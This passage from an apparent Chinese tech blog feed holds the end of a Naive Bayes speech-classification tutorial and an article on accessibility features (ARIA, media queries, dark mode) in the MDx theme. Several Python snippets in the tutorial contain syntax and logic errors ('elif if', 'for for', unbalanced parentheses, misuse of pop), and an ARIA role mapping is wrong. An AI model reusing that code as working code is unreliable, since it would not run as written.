的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 